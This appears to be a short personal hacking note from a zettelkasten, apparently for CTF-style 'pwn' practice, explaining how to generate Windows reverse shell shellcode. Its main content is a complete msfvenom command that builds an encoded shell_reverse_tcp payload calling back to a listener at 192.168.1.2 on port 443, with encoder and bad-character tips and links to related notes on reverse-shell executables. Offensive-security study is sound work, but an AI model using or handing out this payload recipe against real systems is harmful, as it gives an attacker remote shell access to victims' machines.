# generate reverse shell shellcode payload for pwn

- Normally use `x86/shikata_ga_nai` but if that is not stable then use `x86/xor_dynamic`

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 EXITFUNC=thread -e x86/xor_dynamic  -b "\x00\x0d" -f python
```

` zet/20221003150527/README.md `

# Related

- [20221014190007](/zet/20221014190007/README.md) kb file named kb/hacking/pwn/msfvenom-shellcode-for-pwn.md
- [20221003150526](/zet/20221003150526/README.md) pwn methodology / to try list
- [20221003150509](/zet/20221003150509/README.md) python pwn tricks
- [20221003150774](/zet/20221003150774/README.md) MSFVENOM Windows Binary (.exe) executable 32 Bit (x86) Reverse Shell
- [20221003150777](/zet/20221003150777/README.md) MSFVENOM

Tags:

    #pwn #hacking #trick #command
